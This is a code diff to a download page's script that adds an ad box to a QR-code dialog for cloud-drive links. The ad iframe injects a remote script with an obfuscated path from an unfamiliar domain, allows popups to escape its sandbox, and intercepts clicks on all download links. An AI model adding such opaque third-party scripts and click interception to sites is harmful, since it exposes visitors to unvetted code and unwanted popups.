@@ -913,7 +913,9 @@ function copyToClip(content,message) {
         font-size: 13px; line-height: 1.7;
         text-align: center;
     }
-    #mdui-qr-dialog-template .qr-actions { padding: 0 28px 28px; }
+    #mdui-qr-dialog-template .qr-actions { padding: 0 28px 20px; }
+    #mdui-qr-dialog-template .qr-ad { padding: 0 20px 20px; }
+    #mdui-qr-dialog-template .qr-ad iframe { display: block; width: 100%; height: 180px; border: 0; border-radius: 8px; }
     #mdui-qr-dialog-template .qr-open { display: flex; justify-content: center; align-items: center; min-height: 44px; border-radius: 10px; font-size: 14px; font-weight: 600; text-decoration: none; }
     #mdui-qr-dialog-template .qr-open:hover { box-shadow: inset 0 0 0 100px rgba(0,0,0,.1); }
     #mdui-qr-dialog-template :focus-visible { outline: 3px solid var(--qr-text); outline-offset: 3px; }
@@ -929,7 +931,7 @@ function copyToClip(content,message) {
 
 <div class="mdui-dialog" id="mdui-qr-dialog-template" role="dialog" aria-modal="true" aria-label="夸克网盘下载二维码" aria-describedby="qr-dialog-description">
     <div class="qr-header">
-        <p class="qr-subtitle">扫描二维码保存文件</p>
+        <p class="qr-subtitle">建议您手机端扫码保存后下载</p>
         <button type="button" class="qr-close" aria-label="关闭扫码弹窗" mdui-dialog-close>&times;</button>
     </div>
     <div class="mdui-dialog-content">
@@ -940,7 +942,10 @@ function copyToClip(content,message) {
         </div>
     </div>
     <div class="qr-actions">
-        <a class="qr-open mdui-color-theme-accent mdui-ripple" id="qr-dialog-open-link" target="_blank" rel="noopener noreferrer">直接打开网盘链接 ↗</a>
+        <a class="qr-open mdui-color-theme-accent mdui-ripple" id="qr-dialog-open-link" target="_blank" rel="noopener noreferrer">继续打开链接</a>
+    </div>
+    <div class="qr-ad">
+        <iframe id="qr-dialog-ad" title="广告" sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox" referrerpolicy="no-referrer-when-downgrade"></iframe>
     </div>
 </div>
 
@@ -960,6 +965,10 @@ document.addEventListener('DOMContentLoaded', function() {
         history: false // 禁用历史记录，避免影响浏览器后退
     });
 
+    const boundLinks = new WeakSet();
+    const adFrame = document.getElementById('qr-dialog-ad');
+    const adHtml = "\u003c!doctype html>\u003chtml>\u003chead>\u003cmeta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\u003cbase href=\"https://yun.daxiaamu.com/\">\u003c/head>\u003cbody style=\"margin:0\">\u003cscript>(function(inj){\nvar d = document,\n    s = d.createElement('script'),\n    l = d.scripts[d.scripts.length - 1];\ns.settings = inj || {};\ns.src = \"//untimely-hello.com/bVX.Vcspd/GQlZ0QYKWTcm/uexmX9GuBZsUTlJkaPpTEYl4dNeDqc/2kM_D/kXtFNljDgv0tNFzFYyxlMvwG\";\ns.async = true;\ns.referrerPolicy = 'no-referrer-when-downgrade';\nl.parentNode.insertBefore(s, l);\n})({})\u003c/script>\u003c/body>\u003c/html>";
+
     // 核心函数：查找链接并添加图标
     function findAndAddQRCodeIcon() {
         const targetLinks = Array.from(document.querySelectorAll('a'))
@@ -968,7 +977,8 @@ document.addEventListener('DOMContentLoaded', function() {
         targetLinks.forEach(link => {
             const provider = link.textContent.includes('从迅雷网盘下载') ? '迅雷' : '夸克';
             const url = link.href;
-            if (!url) return;
+            if (!url || boundLinks.has(link)) return;
+            boundLinks.add(link);
 
             // 检查是否已经添加了图标
             if (link.nextElementSibling && link.nextElementSibling.classList.contains('injected-qr-icon-footer')) {
@@ -986,9 +996,9 @@ document.addEventListener('DOMContentLoaded', function() {
             link.parentNode.insertBefore(qrIcon, link.nextSibling);
 
             // 绑定点击事件
-            qrIcon.addEventListener('click', function(event) {
+            function openDownloadDialog(event) {
                 event.preventDefault(); 
-                event.stopPropagation(); 
+                event.stopImmediatePropagation();
                 
                 // 每次点击前，清空旧二维码（防止重复渲染）
                 canvasContainer.innerHTML = '';
@@ -1015,8 +1025,15 @@ document.addEventListener('DOMContentLoaded', function() {
                 });
 
                 // 使用 MDUI API 显示弹窗
+                if (!adFrame.dataset.loaded) {
+                    adFrame.dataset.loaded = 'true';
+                    adFrame.srcdoc = adHtml;
+                }
                 mduiDialog.open();
-            });
+            }
+            // Capture the link before the theme's PJAX handler navigates away.
+            link.addEventListener('click', openDownloadDialog, true);
+            qrIcon.addEventListener('click', openDownloadDialog);
         });
     }
 
